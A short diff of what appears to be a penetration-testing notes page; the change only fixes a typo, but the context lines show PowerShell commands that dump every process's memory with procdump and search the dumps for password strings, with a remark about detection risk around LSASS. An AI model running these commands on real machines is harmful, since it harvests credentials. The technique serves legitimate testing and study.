@@ -30,7 +30,7 @@ Get-Process | % {procdump.exe -ma $_.Id }
 gci *.dmp | % { strings.exe -n 17 $_.Name | Select-String "password=" | Out-File ($_.Name+".txt")}
 ```
 > **Important Note:**
-> It's recommended to dump a single process at a time for investigation because dumping all processes takes alot of time and could trigger detections especially when working with LSASS.
+> It's recommended to dump a single process at a time for investigation because dumping all processes takes a lot of time and could trigger detections especially when working with LSASS.
 > 
 > **Download:** https://download.sysinternals.com/files/SysinternalsSuite.zip
 
